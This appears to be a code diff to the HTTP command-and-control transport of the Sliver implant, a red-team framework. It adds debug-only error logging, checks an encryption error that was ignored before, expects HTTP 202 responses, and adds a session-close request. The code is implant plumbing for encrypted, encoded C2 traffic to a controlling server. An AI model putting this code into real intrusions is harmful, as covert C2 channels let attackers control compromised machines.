@@ -166,19 +166,31 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 
 	resp, err := s.Client.Do(req)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] http response error: %s", err)
+		// {{end}}
 		return err
 	}
 	if resp.StatusCode != 200 {
+		// {{if .Config.Debug}}
+		log.Printf("[http] non-200 response (%d): %v", resp.StatusCode, resp)
+		// {{end}}
 		return errors.New("send failed")
 	}
 	respData, _ := ioutil.ReadAll(resp.Body)
 	defer resp.Body.Close()
 	data, err := encoder.Decode(respData)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] response decoder failure: %s", err)
+		// {{end}}
 		return err
 	}
 	sessionID, err := s.SessionCtx.Decrypt(data)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] response decrypt failure: %s", err)
+		// {{end}}
 		return err
 	}
 	s.SessionID = string(sessionID)
@@ -255,12 +267,21 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	data, err := proto.Marshal(envelope)
 	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to encode request: %s", err)
+		// {{end}}
 		return err
 	}
 	if s.SessionID == "" {
 		return errors.New("no session")
 	}
-	reqData, _ := s.SessionCtx.Encrypt(data)
+	reqData, err := s.SessionCtx.Encrypt(data)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] failed to encrypt request: %s", err)
+		// {{end}}
+		return err
+	}
 
 	uri := s.sessionURL()
 	nonce, encoder := encoders.RandomEncoder()
@@ -268,19 +289,49 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 	reader := bytes.NewReader(encoder.Encode(reqData))
 
 	// {{if .Config.Debug}}
-	log.Printf("[http] POST -> %s", uri)
+	log.Printf("[http] POST -> %s (%d bytes)", uri, len(reqData))
 	// {{end}}
 
 	req := s.newHTTPRequest(http.MethodPost, uri, reader)
 	resp, err := s.Client.Do(req)
 	if err != nil {
 		// {{if .Config.Debug}}
-		log.Printf("[http] POST failed %v", err)
+		log.Printf("[http] request failed %v", err)
 		// {{end}}
 		return err
 	}
-	if resp.StatusCode != 200 {
+	if resp.StatusCode != 202 {
+		// {{if .Config.Debug}}
+		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
+		// {{end}}
 		return errors.New("{{if .Config.Debug}}HTTP send failed (non-200 resp){{end}}")
+	}
+	return nil
+}
+
+func (s *SliverHTTPClient) CloseSession() error {
+	if s.SessionID == "" {
+		return errors.New("no session")
+	}
+	uri := s.closeURL()
+	nonce, _ := encoders.RandomEncoder()
+	s.NonceQueryArgument(uri, nonce)
+	req := s.newHTTPRequest(http.MethodGet, uri, nil)
+	// {{if .Config.Debug}}
+	log.Printf("[http] GET -> %s", uri)
+	// {{end}}
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("[http] GET failed %v", err)
+		// {{end}}
+		return err
+	}
+	if resp.StatusCode != 202 {
+		// {{if .Config.Debug}}
+		log.Printf("[http] non-202 response (%d): %v", resp.StatusCode, resp)
+		// {{end}}
+		return errors.New("{{if .Config.Debug}}HTTP close failed (non-200 resp){{end}}")
 	}
 	return nil
 }
